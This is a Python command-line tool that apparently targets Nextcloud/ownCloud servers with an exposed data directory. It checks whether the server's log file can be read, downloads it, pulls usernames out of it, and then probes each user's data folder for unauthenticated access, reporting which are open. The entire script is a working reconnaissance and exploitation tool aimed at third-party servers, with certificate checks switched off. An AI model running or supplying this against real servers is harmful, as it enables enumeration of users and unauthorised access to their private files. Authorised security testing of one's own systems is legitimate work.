from requests.packages.urllib3.exceptions import InsecureRequestWarning
import subprocess
import sys
import requests
import os
import click
import pyperclip
from tqdm import tqdm
from tabulate import tabulate
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

FILE_STORAGE_PATH = '/tmp/lednerb-nextcloud-owncloud.log'

def checkUrlVulnerability(url):
    output = url + ",false"

    with requests.get(url, stream=True, verify=False, allow_redirects=False) as response:
        if response.status_code == 200:
            for chunk in response.iter_content(chunk_size=16 * 1024, decode_unicode=True):
                if '"reqId"' in str(chunk):
                    return True
    
    return False   


def downloadLogFile(url):
    with requests.get(url, stream=True, verify=False, allow_redirects=False) as response:
        total_size_in_bytes = int(response.headers.get('content-length', 0))
        progress_bar = tqdm(total=total_size_in_bytes,
                            unit='iB', unit_scale=True, desc="Downloading: ")
        with open(FILE_STORAGE_PATH, 'wb') as file:
            for chunk in response.iter_content(chunk_size=16 * 1024):
                progress_bar.update(len(chunk))
                file.write(chunk)
    progress_bar.close()


def extractUsernames():
    usernames = os.popen('cat ' + FILE_STORAGE_PATH +
                         ' | grep \'"user":\' | awk -F\'"user":"\' \'{print $2}\' | cut -d \'"\' -f 1 | sort -u').read().splitlines()

    try:
        usernames.remove("--")
    except:
        pass

    return usernames


@click.command()
@click.argument('url')
@click.option('-u', '--usernames', help="File with usernames (one line per username) instead of extracting from log-file")
@click.option('-c', '--clipboard', is_flag=True, default=False, help="Copy usernames to clipboard [only works when run natively]")
@click.option('-o', '--outputPath', help="Write output given directory")
def main(url, clipboard, usernames, outputpath):

    data = []
    if usernames == None:
        if not checkUrlVulnerability(url):
            print('URL is not vulnerable')
            exit(0)

        downloadLogFile(url)
        usernames = extractUsernames()
    else:
        usernames = open(usernames).read().splitlines()

    dataDirectory = url.rsplit('/', 1)[0]
    for username in usernames:
        accessPossible = False

        response = requests.get(
            dataDirectory + '/' + username + '/', verify=False, allow_redirects=False)
        if response.status_code == 200:
            accessPossible = True

        data.append([username, accessPossible, response.url])

    print()
    print(tabulate(data, headers=[
        "Username", "Data Access Possible", "URL"]))

    if outputpath:
        content = tabulate(data, headers=[
        "Username", "Data Access Possible", "URL"], tablefmt="tsv")
        text_file = open(outputpath + urlparse(url).netloc + ".csv", "w")
        text_file.write(content)
        text_file.close()

    if clipboard:
        print('\n\n')
        pyperclip.copy('\n'.join(usernames))
        print("Usernames copied to clipboard!\n")


if __name__ == '__main__':
    main()
